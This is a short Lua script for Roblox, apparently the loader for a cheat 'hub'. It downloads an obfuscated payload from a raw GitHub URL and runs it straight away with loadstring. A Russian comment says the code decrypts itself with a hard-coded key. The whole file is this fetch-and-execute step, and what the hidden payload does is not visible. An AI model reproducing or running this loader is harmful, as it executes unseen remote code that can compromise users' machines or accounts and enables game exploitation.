local payload_url = "https://raw.githubusercontent.com/d3660379-rgb/Turbo-hubs-scripts/refs/heads/main/Turbo-BY-Lori-s-Nightmare-script" 

local success, obfuscated_code = pcall(function()
    return game:HttpGet(payload_url, true)
end)

if success and obfuscated_code then
    loadstring(obfuscated_code)() -- Эта команда запустит весь ваш огромный код, который сам себя расшифрует ключом "Gemini2025".
end
